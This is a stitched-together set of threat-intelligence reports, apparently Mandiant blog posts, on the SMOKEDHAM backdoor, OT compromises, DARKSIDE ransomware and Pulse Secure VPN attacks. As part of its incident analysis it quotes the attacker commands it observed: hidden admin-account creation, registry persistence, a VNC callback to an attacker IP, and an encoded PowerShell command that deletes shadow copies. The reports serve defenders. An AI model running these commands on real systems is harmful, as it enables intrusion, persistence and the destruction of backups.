file. <html><head>..<script language='VBScript'>..On Error Resume Next At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code. It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant. A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served. Figure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6. Figure 6: SMOKEDHAM downloader Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler. csc.exe /noconfig /fullpaths @'C:\\Users\\ [username]\\AppData\\Local\\Temp\\qnxfhfim\\qnxfhfim.cmdline' Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file. .../t:library /utf8output /R:'System.dll' /R:'C:\\windows\\Microso After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM. Phase 4: SMOKEDHAM Dropper The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor. The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor. The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable. In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable. The SMOKEDHAM backdoor source code is embedded as an encrypted string. The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet. After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point. The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval. Figure 7 shows the deobfuscated SMOKEDHAM dropper. Figure 7: SMOKEDHAM dropper Phase 5: SMOKEDHAM Backdoor SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture. The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server. SMOKEDHAM Network Communications SMOKEDHAM communicates with its C2 server using HTTPS. The backdoor uses domain fronting to obfuscate its true C2 server. The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor. Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication. The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests. The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses. The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data. The ID field contains a unique value generated by the backdoor for the target system. The UUID field may contain a unique value used to track command output or be empty. When the C2 server responds with a command to execute, it sets the UUID field to a unique value. SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output. The Data field may contain RC4-encrypted, Base64-encoded command data or be empty. The backdoor uses the Data field to send command output to its C2 server. The C2 server uses the Data field to send commands to the backdoor to execute. The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field. Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption. SMOKEDHAM Commands SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field. The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1. Keyword Action delay Update its sleep interval screenshot Upload a screen capture to its C2 server via a subsequent HTTP POST request exit Terminate Table 1: Plaintext command data keywords If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it. The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request. In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes. The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests. SMOKEDHAM In Action SMOKEDHAM was observed executing commands on the target system using PowerShell. The following commands were used to collect information about the system and logged in users. net.exe user net.exe users whoami.exe whoami.exe /priv systeminfo.exe The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen. net.exe user DefaultUser REDACTED /ADD net.exe localgroup Administrators DefaultUser /ADD reg.exe ADD 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' /v DefaultUser /t REG_DWORD /d 0 /f The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication. reg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fSingleSessionPerUser /t REG_DWORD /d 0 /f reg.exe ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LimitBlankPasswordUse /t REG_DWORD /d 1 /f Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching. Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8. These files were saved to the %APPDATA%\\Chrome\\ directory. The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1. Figure 8: Contents of UltraVNC.ini SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions. %APPDATA%\\Chrome\\winvnc.exe' -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 –run SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key. reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ConhostNT /d %appdata%\\Chrome\\winvnc.exe NGROK Configuration SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml. These files were stored in the C:\\ProgramData\\WindNT\\ directory. NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels. Figure 9 and Figure 10 show the contents of VirtualHost.vbs and ngrok.yml files, respectively. Figure 9: Contents of VirtualHost.vbs Figure 10: Contents of ngrok.yml The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment. SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key. reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindNT /d C:\\ProgramData\\WindNT\\VirtualHost.vbs Keylogger Deployment This attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe. The keylogging utility was configured to capture and record keystrokes to C:\\ProgramData\\psh\\System32Log.txt. Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility. The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations: C:\\Users\\[username]\\Start Menu\\Programs\\Startup\\desktop.lnk %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.lnk %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\console.lnk Cobalt Strike Beacon The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe. Update.exe was a Go based dropper created using the ScareCrow framework. The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt. cmd.exe /c 'C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe'&&exit The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed. Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory. Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload. LSASS Dumping and Lateral Movement Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\ directory. From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections. Conclusion UNC2465 established initial access via a Trojanized installer executed by an unsuspecting user. UNC2465 interactively established an NGROK tunnel and began moving laterally in less than 24 hours. Five days later, UNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and conducted credential harvesting via dumping LSASS memory. Ransomware groups continue to adapt and pursue opportunistic access to victims. UNC2465’s move from drive-by attacks on website visitors or phishing emails to this software supply chain attack shows a concerning shift that presents new challenges for detection. While many organizations are now focusing more on perimeter defenses and two-factor authentication after recent public examples of password reuse or VPN appliance exploitation, monitoring on endpoints is often overlooked or left to traditional antivirus. A well-rounded security program is essential to mitigate risk from sophisticated groups such as UNC2465 as they continue to adapt to a changing security landscape.

                "text": "Attacks on control processes supported by operational technology (OT) are often perceived as necessarily complex. This is because disrupting or modifying a control process to cause a predictable effect is often quite difficult and can require a lot of time and resources. However, Mandiant Threat Intelligence has observed simpler attacks, where actors with varying levels of skill and resources use common IT tools and techniques to gain access to and interact with exposed OT systems. The activity is typically not sophisticated and is normally not targeted against specific organizations. Rather, the compromises appear to be driven by threat actors who are motivated to achieve ideological, egotistical, or financial objectives by taking advantage of an ample supply of internet-connected OT systems. As the actors are not interested in causing specific physical outcomes, they target whatever is available on the internet. Mandiant has observed an increase in compromises of internet-accessible OT assets over the past several years. In this blog post we discuss previously undisclosed compromises and place them in context alongside publicly known incidents. Although none of these incidents have appeared to significantly impact the physical world, their increasing frequency and relative severity calls for analysis on their possible risks and implications. Visit our website to learn more about Mandiant’s OT security practice or contact us directly to request Mandiant services or threat intelligence . Compromises of Internet-Exposed OT Are Increasing in Frequency While Mandiant has monitored threat actors claiming to share or sell access to internet-exposed OT systems since at least 2012, we have seen a significant increase in the frequency and relative severity of incidents in the past few years. The most common activity we observe involves actors trying to make money off exposed OT systems, but we also see actors simply sharing knowledge and expertise. More recently, we have observed more low sophistication threat activity leveraging broadly known tactics, techniques, and procedures (TTPs), and commodity tools to access, interact with, or gather information from internet exposed assets—something we had seen very little of in the past. This low sophistication threat activity has impacted a variety of targets across different industries, ranging from solar energy panels and water control systems, to building automation systems (BAS) and home security systems in academic and private residences. While some critical infrastructure targets are very sensitive in nature, other targets present very little risk. The following timeline presents a selection of some public and previously undisclosed OT compromises Mandiant observed between 2020 and early 2021. We note that, although it is possible many of these incidents involved process interaction, high confidence validation is not feasible as most often the evidence is provided by the actor itself. Figure 1: Selection of notable low sophistication OT compromises: January 2020 to April 2021 Low Sophistication OT Threat Activity Can Take Many Forms A consistent characteristic we observe among low sophisticated compromises is that actors most often exploit unsecure remote access services, such as virtual network computing (VNC) connections, to remotely access the compromised control systems. Graphical user interfaces (GUI), such as human machine interfaces (HMI), become the low-hanging fruit of process-oriented OT attacks as they provide a user-friendly representation of complex industrial processes, which enables actors to modify control variables without prior knowledge of a process. In many cases, the actors showed evidence of compromised control processes via images of GUIs, IP addresses, system timestamps, and videos. Low Sophistication Threat Actors Access HMIs and Manipulate Control Processes In March 2020, we analyzed a series of screenshots shared by a threat actor who claimed to compromise dozens of control systems across North America, Western and Central Europe, and East Asia. Based on the timestamps from the images, the actor appeared to gain unauthorized access to these assets over a five-day period. The actor also shared a low-quality cell phone video showing their explicit interaction with a Dutch-language temperature control system. While much of this type of activity appears opportunistic in nature, some may also be driven by political motivations. For example, we have seen hacktivist groups that frequently use anti-Israel/pro-Palestine rhetoric in social media posts share images indicating that they had compromised OT assets in Israel, including a solar energy asset and the webserver of a datalogger used for different applications such as mining exploration and dam surveillance (Figure 2). Figure 2: Screenshots of compromised web-interfaces supporting OT Some threat actors appear particularly eager to demonstrate their interaction with compromised control systems. One threat actor shared multiple screen recordings making arbitrary set point changes to compromised HMIs via remote connections from their own desktop. While we suspect many of the victims compromised by this threat actor were small- and medium-sized businesses, on one occasion the group appeared to have successfully accessed the BAS of a hotel in Australia belonging to a major international hotel chain (Figure 3). Figure 3: Screenshots showing a possible compromise of a hotel BAS Some Amateur Actors Show Limited OT Expertise Some of the actors we track made comments that indicated they had either a limited understanding of the OT assets they compromised or that they were simply attempting to gain notoriety. For example, one threat actor shared a screenshot of a purportedly compromised German-language rail control system. We conducted a reverse image search of the screenshot and identified the asset as the web interface for an ECoS 50210 command station designed for model train sets (Figure 4). Figure 4: “Rail control system” that was really a web-interface for a model train set Another group made a similar gaffe when they claimed to retaliate for an explosion at a missile facility in Iran by compromising an Israeli “gas system.” A video of their operation showed that they had actually compromised a kitchen ventilation system installed at a restaurant in Ramat Hasharon, Israel (Figure 5). Figure 5: “Gas system” that was really a kitchen ventilation system Low Sophistication OT Threat Activity is Supported by Hacktivist Tutorials In a few instances, actors operating as part of hacktivist collectives created and shared tutorials that instructed their affiliates and sympathetic parties on how to identify and compromise internet-accessible OT assets. The tutorials typically described simple methodologies, such as using VNC utilities to connect to IP addresses identified in Shodan or Censys searches for port 5900. These methods appear to have been used in some of the incidents we described, as some of the shared screenshots of compromised OT systems also showed the actor’s web browser tabs displaying similar Shodan queries and remote access tools. Figure 6: Hacktivist tutorial describing how to access the HMI of an industrial gas and liquid burner Low Sophistication OT Compromises Pose A Growing Risk Each of the low sophistication incidents we observe is unique and poses a different level of risk, which we normally determine by examining the actor’s previous work and reputation, the target’s industry, and the nature of the compromised process, among other things. While low sophistication incidents do not appear to commonly impact physical environments, they remain concerning for the following reasons. Each incident provides threat actors with opportunities to learn more about OT, such as the underlying technology, physical processes, and operations. These opportunities can increase an adversary's ability and enhance their tradecraft. Even low-sophistication intrusions into OT environments carry the risk of disruption to physical processes, mainly in the case of industries or organizations with less mature security practices. As the number of intrusions increase, so does the risk of process disruption. The publicity of these incidents normalizes cyber operations against OT and may encourage other threat actors to increasingly target or impact these systems. This is consistent with the increase in OT activity by more resourced financially-motivated groups and ransomware operators. Security Best Practices and Situational Awareness Help Prevent Low Sophistication Compromises Defense against low sophistication compromises is best addressed by implementing security best practices and gaining situational awareness about the threat exposure of assets and data. Implementing security controls to defend against this activity is also the foundation for mature security programs that seek to prevent and identify complex OT threats before they introduce a risk to the safety of people and infrastructure. Whenever feasible, remove OT assets from public-facing networks. If remote access is required, deploy access controls and monitor traffic for unusual activity to minimize unintended interaction and safeguard asset information. Apply common network-hardening techniques to remotely accessible and edge devices, such as disabling unused services, changing default credentials, reviewing asset configurations, and creating whitelists for access. Determine if relevant assets are discoverable using online scanners such as Shodan and Censys. Leverage support from knowledgeable security researchers to identify exposed assets and leaked information. Mandiant Threat Intelligence offers subscription content, custom analysis, and black box assessments that help organizations identify internet-exposed assets and information. Maintain situational awareness on threat actors’ interest in cyber physical systems and the development of OT exploits , with particular interest in attention driven to your organization, third party providers, or original equipment manufacturers (OEM). Configure HMIs and other control system assets to enforce acceptable input ranges and prohibit hazardous variable states. Similar to web application security, automation programmers should treat all operator input as potentially malicious and gain security assurances by validating that the operator input is within acceptable thresholds.

                "text": "Update (May 14): Mandiant has observed multiple actors cite a May 13 announcement that appeared to be shared with DARKSIDE RaaS affiliates by the operators of the service. This announcement stated that they lost access to their infrastructure, including their blog, payment, and CDN servers, and would be closing their service. Decrypters would also be provided for companies who have not paid, possibly to their affiliates to distribute. The post cited law enforcement pressure and pressure from the United States for this decision. We have not independently validated these claims and there is some speculation by other actors that this could be an exit scam. Background Since initially surfacing in August 2020, the creators of DARKSIDE ransomware and their affiliates have launched a global crime spree affecting organizations in more than 15 countries and multiple industry verticals. Like many of their peers, these actors conduct multifaceted extortion where data is both exfiltrated and encrypted in place, allowing them to demand payment for unlocking and the non-release of stolen data to exert more pressure on victims. The origins of these incidents are not monolithic. DARKSIDE ransomware operates as a ransomware-as-a-service (RaaS) wherein profit is shared between its owners and partners, or affiliates, who provide access to organizations and deploy the ransomware. Mandiant currently tracks multiple threat clusters that have deployed this ransomware, which is consistent with multiple affiliates using DARKSIDE. These clusters demonstrated varying levels of technical sophistication throughout intrusions. While the threat actors commonly relied on commercially available and legitimate tools to facilitate various stages of their operations, at least one of the threat clusters also employed a now patched zero-day vulnerability. Reporting on DARKSIDE has been available in advance of this blog post to users of Mandiant Advantage Free , a no-cost version of our threat intelligence platform. Targeting Mandiant has identified multiple DARKSIDE victims through our incident response engagements and from reports on the DARKSIDE blog. Most of the victim organizations were based in the United States and span across multiple sectors, including financial services, legal, manufacturing, professional services, retail, and technology. The number of publicly named victims on the DARKSIDE blog has increased overall since August 2020, with the exception of a significant dip in the number of victims named during January 2021 (Figure 1). It is plausible that the decline in January was due to threat actors using DARKSIDE taking a break during the holiday season. The overall growth in the number of victims demonstrates the increasing use of the DARKSIDE ransomware by multiple affiliates. Figure 1: Known DARKSIDE victims (August 2020 to April 2021) DARKSIDE Ransomware Service Beginning in November 2020, the Russian-speaking actor \"darksupp\" advertised DARKSIDE RaaS on the Russian-language forums exploit.in and xss.is. In April 2021, darksupp posted an update for the \"Darkside 2.0\" RaaS that included several new features and a description of the types of partners and services they were currently seeking (Table 1). Affiliates retain a percentage of the ransom fee from each victim. Based on forum advertisements, the RaaS operators take 25% for ransom fees less than $500,000, but this decreases to 10 percent for ransom fees greater than $5 million. In addition to providing builds of DARKSIDE ransomware, the operators of this service also maintain a blog accessible via TOR. The actors use this site to publicize victims in an attempt to pressure these organizations into paying for the non-release of stolen data. A recent update to their underground forum advertisement also indicates that actors may attempt to DDoS victim organizations. The actor darksupp has stated that affiliates are prohibited from targeting hospitals, schools, universities, non-profit organizations, and public sector entities. This may be an effort by the actor(s) to deter law enforcement action, since targeting of these sectors may invite additional scrutiny. Affiliates are also prohibited from targeting organizations in Commonwealth of Independent States (CIS) nations.

Within this panel, affiliates can perform various actions such as creating a ransomware build, specifying content for the DARKSIDE blog, managing victims, and contacting support. Mandiant has identified at least five Russian-speaking actors who may currently, or have previously, been DARKSIDE affiliates. Relevant advertisements associated with a portion of these threat actors have been aimed at finding either initial access providers or actors capable of deploying ransomware on accesses already obtained. Some actors claiming to use DARKSIDE have also allegedly partnered with other RaaS affiliate programs, including BABUK and SODINOKIBI (aka REvil). For more information on these threat actors, please see Mandiant Advantage . Figure 2: DARKSIDE affiliate panel Attack Lifecycle Mandiant currently tracks five clusters of threat activity that have involved the deployment of DARKSIDE. For more information on uncategorized threats, refer to our post, \" DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors .\" These clusters may represent different affiliates of the DARKSIDE RaaS platform. Throughout observed incidents, the threat actor commonly relied on various publicly available and legitimate tools that are commonly used to facilitate various stages of the attack lifecycle in post-exploitation ransomware attacks (Figure 3). Additional details on three of these UNC groups are included below. Figure 3: TTPs seen throughout DARKSIDE ransomware engagements UNC2628 UNC2628 has been active since at least February 2021. Their intrusions progress relatively quickly with the threat actor typically deploying ransomware in two to three days. We have some evidence that suggests UNC2628 has partnered with other RaaS including SODINOKIBI (REvil) and NETWALKER. In multiple cases we have observed suspicious authentication attempts against corporate VPN infrastructure immediately prior to the start of interactive intrusion operations. The authentication patterns were consistent with a password spraying attack, though available forensic evidence was insufficient to definitively attribute this precursor activity to UNC2628. In cases where evidence was available, the threat actor appeared to obtain initial access through corporate VPN infrastructure using legitimate credentials. UNC2628 has interacted with victim environments using various legitimate accounts, but in multiple cases has also created and used a domain account with the username 'spservice'. Across all known intrusions, UNC2628 has made heavy use of the Cobalt Strike framework and BEACON payloads. BEACON command and control (C2) infrastructure attributed to this actor has included the following: hxxps://104.193.252[.]197:443/ hxxps://162.244.81[.]253:443/ hxxps://185.180.197[.]86:443/ hxxps://athaliaoriginals[.]com/ hxxps://lagrom[.]com:443/font.html hxxps://lagrom[.]com:443/night.html hxxps://lagrom[.]com:443/online.html hxxps://lagrom[.]com:443/send.html hxxps://lagrom[.]com/find.html?key=id#- In at least some cases there is evidence to suggest this actor has employed Mimikatz for credential theft and privilege escalation. The threat actor appeared to have used built-in commands such as ‘net’ and ‘ping’ to perform basic reconnaissance of the internal network, though it is likely that additional reconnaissance was performed via BEACON and not represented in available log sources. UNC2628 has moved laterally in environments almost exclusively via RDP using legitimate credentials and Cobalt Strike BEACON payloads. This threat cluster uses both HTTPS BEACON payloads and SMB BEACON, the latter almost exclusively using named pipes beginning with “\\\\.\\pipe\\UIA_PIPE_” Intrusions attributed to this threat cluster have progressed swiftly from intrusion to data theft and ransomware deployment, and have thus not focused heavily on maintaining a persistent foothold in impacted environments.  Despite this, UNC2628 has maintained access via the collection of legitimate credentials, the creation of attacker-controlled domain accounts (spservice), and via the creation of Windows services intended to launch BEACON. Notably, UNC2628 has repeatedly loaded BEACON with a service named ‘CitrixInit’. UNC2628 has also employed F-Secure Lab s' Custom Command and Control (C3) framework, deploying relays configured to proxy C2 communications through the Slack API. Based on this actor's other TTPs they were likely using C3 to obfuscate Cobalt Strike BEACON traffic. The threat actor has exfiltrated data over SFTP using Rclone to systems in cloud hosting environments. Rclone is a command line utility to manage files for cloud storage applications. Notably, the infrastructure used for data exfiltration has been reused across multiple intrusions. In one case, the data exfiltration occurred on the same day that the intrusion began. UNC2628 deploys DARKSIDE ransomware encryptors using PsExec to a list of hosts contained in multiple text files. The threat actor has used the following directories, placing copies of backdoors, ransomware binaries, copies of PsExec, and lists of victim hosts within them. C:\\run\\ C:\\home\\ C:\\tara\\ C:\\Users\\[username]\\Music\\ C:\\Users\\Public UNC2659 UNC2659 has been active since at least January 2021. We have observed the threat actor move through the whole attack lifecycle in under 10 days. UNC2659 is notable given their use of an exploit in the SonicWall SMA100 SSL VPN product, which has since been patched by SonicWall. The threat actor appeared to download several tools used for various phases of the attack lifecycle directly from those tools’ legitimate public websites. The threat actor obtained initial access to their victim by exploiting CVE-2021-20016 , an exploit in the SonicWall SMA100 SSL VPN product, which has been patched by SonicWall. There is some evidence to suggest the threat actor may have used the vulnerability to disable multi-factor authentication options on the SonicWall VPN, although this has not been confirmed. The threat actor leveraged TeamViewer (TeamViewer_Setup.exe) to establish persistence within the victim environment. Available evidence suggests that the threat actor downloaded TeamViewer directly from the following URL and also browsed for locations from which they could download the AnyDesk utility. hxxps://dl.teamviewer[.]com/download/version_15x/TeamViewer_Setup.exe The threat actor appeared to download the file rclone.exe directly from rclone[.]org - hxxps://downloads.rclone[.]org/v1.54.0/rclone-v1.54.0-windows-amd64.zip. The threat actors were seen using rclone to exfiltrate hundreds of gigabytes of data over the SMB protocol to the pCloud cloud-based hosting and storage service. The threat actor deployed the file power_encryptor.exe in a victim environment, encrypting files and creating ransom notes over the SMB protocol. Mandiant observed the threat actor navigate to ESXi administration interfaces and disable snapshot features prior to the ransomware encryptor deployment, which affected several VM images. UNC2465 UNC2465 activity dates back to at least April 2019 and is characterized by their use of similar TTPs to distribute the PowerShell-based .NET backdoor SMOKEDHAM in victim environments. In one case where DARKSIDE was deployed, there were months-long gaps, with only intermittent activity between the time of initial compromise to ransomware deployment. In some cases, this could indicate that initial access was provided by a separate actor. UNC2465 used phishing emails and legitimate services to deliver the SMOKEDHAM backdoor. SMOKEDHAM is a .NET backdoor that supports keylogging, taking screenshots, and executing arbitrary .NET commands. During one incident, the threat actor appeared to establish a line of communication with the victim before sending a malicious Google Drive link delivering an archive containing an LNK downloader. More recent UNC2465 emails have used Dropbox links with a ZIP archive containing malicious LNK files that, when executed, would ultimately lead to SMOKEDHAM being downloaded onto the system. UNC2465 has used Advanced IP Scanner, BLOODHOUND, and RDP for internal reconnaissance and lateral movement activities within victim environments. The threat actor has used Mimikatz for credential harvesting to escalate privileges in the victim network. UNC2465 also uses the publicly available NGROK utility to bypass firewalls and expose remote desktop service ports, like RDP and WinRM, to the open internet. Mandiant has observed the threat actor using PsExec and cron jobs to deploy the DARKSIDE ransomware. UNC2465 has called the customer support lines of victims and told them that data was stolen and instructed them to follow the link in the ransom note. Implications We believe that threat actors have become more proficient at conducting multifaceted extortion operations and that this success has directly contributed to the rapid increase in the number of high-impact ransomware incidents over the past few years. Ransomware operators have incorporated additional extortion tactics designed to increase the likelihood that victims will acquiesce to paying the ransom prices. As one example, in late April 2021, the DARKSIDE operators released a press release stating that they were targeting organizations listed on the NASDAQ and other stock markets. They indicated that they would be willing to give stock traders information about upcoming leaks in order to allow them potential profits due to stock price drops after an announced breach. In another notable example, an attacker was able to obtain the victim's cyber insurance policy and leveraged this information during the ransom negotiation process refusing to lower the ransom amount given their knowledge of the policy limits. This reinforces that during the post-exploitation phase of ransomware incidents, threat actors can engage in internal reconnaissance and obtain data to increase their negotiating power. We expect that the extortion tactics that threat actors use to pressure victims will continue to evolve throughout 2021. Based on the evidence that DARKSIDE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat.

Appendix A: DARKSIDE Ransomware Analysis DARKSIDE is a ransomware written in C that may be configured to encrypt files on fixed and removable disks as well as network shares. DARKSIDE RaaS affiliates are given access to an administration panel on which they create builds for specific victims. The panel allows some degree of customization for each ransomware build such as choosing the encryption mode and whether local disks and network shares should be encrypted (Figures 4). The following malware analysis is based on the file MD5: 1a700f845849e573ab3148daef1a3b0b. A more recently analyzed DARKSIDE sample had the following notable differences: The option for beaconing to a C2 server was disabled and the configuration entry that would have contained a C2 server was removed. Included a persistence mechanism in which the malware creates and launches itself as a service. Contained a set of hard-coded victim credentials that were used to attempt to logon as a local user. If the user token retrieved based on the stolen credentials is an admin token and is part of the domain administrators' group, it is used for network enumeration and file permission access. Figure 4: DARKSIDE build configuration options appearing in the administration panel Host-Based Indicators Persistence Mechanism Early versions of the malware did not contain a persistence mechanism. An external tool or installer was required if the attacker desired persistence. A DARKSIDE version observed in May 2021 implement a persistence mechanism through which the malware creates and launches itself as a service with a service name and description named using eight pseudo-randomly defined lowercase hexadecimal characters (e.g., \".e98fc8f7\") that are also appended by the malware to various other artifacts it created.  This string of characters is referenced as <ransom_ext> . : Service Name: <ransom_ext> Description: <ransom_ext> Filesystem Artifacts Created Files %CD%\\LOG<ransom_ext>.TXT README<ransom_ext>.TXT <original_filename_plus_ext><ransom_ext> May version: %PROGRAMDATA%\\<ransom_ext>.ico Registry Artifacts The DARKSIDE version observed in May sets the following registry key: HKCR\\<ransom_ext>\\DefaultIcon\\<ransom_ext>\\DefaultIcon=%PROGRAMDATA%\\<ransom_ext>.ico Details Configuration The malware initializes a 0x100-byte keystream used to decrypt strings and configuration data.

If the OS is older than Windows 10, the malware uses a documented slui.exe file handler hijack technique . This involves setting the registry value HKCU\\Software\\Classes\\exefile\\shell\\open\\command\\Default to the malware path and executing slui.exe using the verb \"runas.\" If the OS version is Windows 10 or newer, the malware attempts a UAC bypass that uses the CMSTPLUA COM interface . The decrypted strings listed in Figure 7 are used to perform this technique. Elevation:Administrator!new: {3E5FC7F9-9A51-4367-9063-A120244FBEC7} Figure 7: Decrypted UAC bypass strings Encryption Setup The malware generates a pseudo-random file extension based on a MAC address on the system. In a DARKSIDE version observed in May 2021, the file extension is generated using a MachineGuid registry value as a seed rather than the MAC address. The file extension consists of eight lowercase hexadecimal characters (e.g., \".e98fc8f7\") and is referred to as <ransom_ext> . The file extension generation algorithm has been recreated in Python . If logging is enabled, the malware creates the log file LOG<ransom_ext>.TXT in its current directory. The malware supports the command line argument \"-path,\" which allows an attacker to specify a directory to target for encryption. The sample analyzed for this report is not configured to perform a system language check. If this functionality were enabled and the check succeeded, the string \"This is a Russian-Speaking System, Exit\" would be written to the log file and the malware would exit. Anti-Recovery Techniques The malware locates and empties Recycle Bins on the system. If the process is running under WOW64, it executes the PowerShell command in Figure 8 using CreateProcess to delete volume shadow copies. powershell -ep bypass -c \"(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F7763 6F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s\" Figure 8: Encoded PowerShell command The decoded command from Figure 4 is \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}.\" If the malware is not running under WOW64, it uses COM objects and WMI commands to delete volume shadow copies.

                "text": "Executive Summary Mandiant recently responded to multiple security incidents involving compromises of Pulse Secure VPN appliances. This blog post examines multiple, related techniques for bypassing single and multifactor authentication on Pulse Secure VPN devices, persisting across upgrades, and maintaining access through webshells. The investigation by Pulse Secure has determined that a combination of prior vulnerabilities and a previously unknown vulnerability discovered in April 2021, CVE-2021-22893 , are responsible for the initial infection vector. Pulse Secure’s parent company, Ivanti, released mitigations for a vulnerability exploited in relation to these malware families and the Pulse Connect Secure Integrity Tool for their customers to determine if their systems are impacted. A final patch to address the vulnerability will be available in early May 2021. Pulse Secure has been working closely with Mandiant, affected customers, government partners, and other forensic experts to address these issues. There is no indication the identified backdoors were introduced through a supply chain compromise of the company’s network or software deployment process. Introduction Mandiant is currently tracking 12 malware families associated with the exploitation of Pulse Secure VPN devices. These families are related to the circumvention of authentication and backdoor access to these devices, but they are not necessarily related to each other and have been observed in separate investigations. It is likely that multiple actors are responsible for the creation and deployment of these various code families. The focus of this report is on the activities of UNC2630 against U.S. Defense Industrial base (DIB) networks, but detailed malware analysis and detection methods for all samples observed at U.S. and European victim organizations are provided in the technical annex to assist network defenders in identifying a large range of malicious activity on affected appliances. Analysis is ongoing to determine the extent of the activity. Mandiant continues to collaborate with the Ivanti and Pulse Secure teams, Microsoft Threat Intelligence Center (MSTIC), and relevant 